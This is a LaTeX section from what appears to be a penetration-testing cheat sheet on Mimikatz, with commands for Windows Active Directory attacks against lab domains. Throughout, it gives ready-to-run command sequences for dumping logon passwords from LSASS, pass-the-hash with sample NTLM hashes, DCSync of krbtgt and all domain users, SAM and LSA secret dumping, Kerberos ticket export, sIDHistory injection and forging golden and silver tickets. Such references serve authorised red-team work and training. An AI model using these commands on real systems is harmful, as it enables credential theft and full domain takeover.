\section{Mimikatz}
\label{tool:mimikatz}
\url{https://tools.thehacker.recipes/mimikatz}
\url{https://adsecurity.org/?page_id=1821}
\url{https://github.com/gentilkiwi/mimikatz/wiki}

\subsection*{Most Popular Mimikatz Commands}

Here are just some of the most popular Mimikatz command and related functionality.
\begin{itemize}
        \item \verb+CRYPTO::Certificates+ – list/export certificates
        \item \verb+KERBEROS::Golden+ – create golden/silver/trust tickets
        \item \verb+KERBEROS::List+ – List all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.Similar to functionality of “klist”.
        \item \verb+KERBEROS::PTT+ – pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust).
        \item \verb+LSADUMP::DCSync+ – ask a DC to synchronize an object (get password data for account). No need to run code on DC.
        \item \verb+LSADUMP::LSA+ – Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: “/name:krbtgt”
        \item \verb+LSADUMP::SAM+ – get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.
        \item \verb+LSADUMP::Trust+ – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).
        \item \verb+MISC::AddSid+ – Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016.
        \item \verb+MISC::MemSSP+ – Inject a malicious Windows SSP to log locally authenticated credentials.
        \item \verb+MISC::Skeleton+ – Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a “master password” (aka Skeleton Keys) as well as their usual password.
        \item \verb+PRIVILEGE::Debug+ – get debug rights (this or Local System rights is required for many Mimikatz commands).
        \item \verb+SEKURLSA::Ekeys+ – list Kerberos encryption keys
        \item \verb+SEKURLSA::Kerberos+ – List Kerberos credentials for all authenticated users (including services and computer account)
        \item \verb+SEKURLSA::Krbtgt+ – get Domain Kerberos service account (KRBTGT)password data
        \item \verb+SEKURLSA::LogonPasswords+ – lists all available provider credentials. This usually shows recently logged on user and computer credentials.
        \item \verb+SEKURLSA::Pth+ – Pass- theHash and Over-Pass-the-Hash
        \item \verb+SEKURLSA::Tickets+ – Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).
        \item \verb+TOKEN::List+ – list all tokens of the system
        \item \verb+TOKEN::Elevate+ – impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box
        \item \verb+TOKEN::Elevate+ /domainadmin – impersonate a token with Domain Admin credentials.

\end{itemize}


\subsection*{logon passwords}
SEKURLSA::LogonPasswords – lists all available provider credentials. This usually shows recently logged on user and computer credentials.

\begin{verbatim}
privilege::debug
sekurlsa::logonpasswords 
\end{verbatim}

\subsection*{Pass-The-Hash}
\label{tool:mimikatz:pth}
\url{https://github.com/gentilkiwi/mimikatz/wiki/module-%7E-sekurlsa#pth}
mimikatz can perform the well-known operation 'Pass-The-Hash' to run a process under another credentials with NTLM hash of the user's password, instead of its real password.

For this, it starts a process with a fake identity, then replaces fake information (NTLM hash of the fake password) with real information (NTLM hash of the real password).
Arguments:
\begin{itemize}
	\item \verb+/user+- the username you want to impersonate, keep in mind that Administrator is not the only name for this well-known account.
    	\item \verb+/domain+ - the fully qualified domain name - without domain or in case of local user/admin, use computer or server name, workgroup or whatever.
    	\item \verb+/rc4+ or \verb+/ntlm+ - optional - the RC4 key / NTLM hash of the user's password.
    	\item \verb+/aes128+ - optional - the AES128 key derived from the user's password and the realm of the domain.
    	\item \verb+/aes256+ - optional - the AES256 key derived from the user's password and the realm of the domain.
    	\item \verb+/run+ - optional - the command line to run - default is: cmd to have a shell.
	\item \verb+/impersonate+ It performs \url{https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/pth#with-token-impersonation}{user token impersonation}. It must be noted that a new process is not spawned but the token is injected on the process running Mimikatz.
\end{itemize}

\begin{verbatim}
sekurlsa::pth /user:tpetty /domain:INLANEFREIGHT.local /ntlm:fd37b6fec5704cadabb319cebf9e3a3a /impersonate
sekurlsa::pth /user:tpetty /domain:INLANEFREIGHT.local /ntlm:fd37b6fec5704cadabb319cebf9e3a3a /run:"psexec \\dc01.INLANEFREIGHT.local -h dir"
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

\end{verbatim}

this will allow to perform 
\begin{verbatim}
lsadump::dcsync /user:tpetty
\end{verbatim}



\subsection*{DCSync}
\label{tool:mimikatz:DCSync}

Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data.

\begin{verbatim}
# DCSync only one user
mimikatz# lsadump::dcsync /domain:FQDN /user:krbtgt

# DCSync all users of the domain
mimikatz# lsadump::dcsync /domain:FQDN /all /csv
\end{verbatim}



warning Read-Only Domain Controllers are not allowed to pull password data for users by default.

\subsection{Dumping Credentials}
\label{tool:mimikatz:cred-dumping}
\subsubsection*{From SAM}
\begin{verbatim}
# Local dumping of SAM secrets on the target
lsadump::sam

# Offline dumping of SAM secrets from exported hives
lsadump::sam /sam:'C:\path\to\sam.save' /system:'C:\path\to\system.save'

# Local dumping of LSA secrets on the target
lsadump::secrets

# Offline dumping LSA secrets from exported hives
lsadump::secrets /security:'C:\path\to\security.save' /system:'C:\path\to\system.save'
\end{verbatim}

\subsubsection*{From LSASS dump}

\begin{verbatim}
privilege::debug
sekurlsa::minidump C:\Users\raj\AppData\Local\Temp\lsass.DMP
sekurlsa::logonpasswords
\end{verbatim}

dumping tickets:
\begin{verbatim}
privilege::debug
sekurlsa::itickets /export
dir *.kirbi
\end{verbatim}




\subsection{Extracting Tickets from Memory}
\label{tool:mimikatz:KRBDUmp}

\begin{verbatim}
base64 /out:true
kerberos::list /export
\end{verbatim}

\subsection*{sIDHistory injection}
\label{tool:mimikatz:sidhistory}
\begin{verbatim}
kerberos::golden /user:NAME /domain:CHILD_FQDN /sid:CHILD_SID \
    /krbtgt:HASH /sids:SID_ETS_ADMIN /ptt

\end{verbatim}

\subsection*{Crafting a silver ticket}

command: \verb+kerberos::golden+ 

parameters:
\begin{itemize}
    \item \verb+/domain+: The FDQN
    \item \verb+/sid+: The SID (Security Identifier) of the Domain (whoami /user)
    \item \verb+/user+: Target Account/Computer to Impersonate
    \item \verb+/id+: RID of the account you will be impersonating
    \item \verb+/ptt+: Optional (Will Inject Ticket or you can do with Rubeus)
    \item \verb+/rc4+: NTLM Hash of User Password/Computer Password
\end{itemize}


\begin{verbatim}
kerberos::golden 
    /domain:DOMAIN_FQDN 
    /user:random_user 
    /sid:S-1-5-21-1473643419-774954089-2222329127
    /rc4:0123456789abcdef0123456789abcdef 
    /target:DESKTOP-01.adsec.local 
    /service:cifs 
    /ptt
\end{verbatim}

This command line creates a ticket for adsec.local domain with an arbitrary
username (\verb+random_user+), and targets CIFS service of DESKTOP-01 machine
by providing its NT hash.
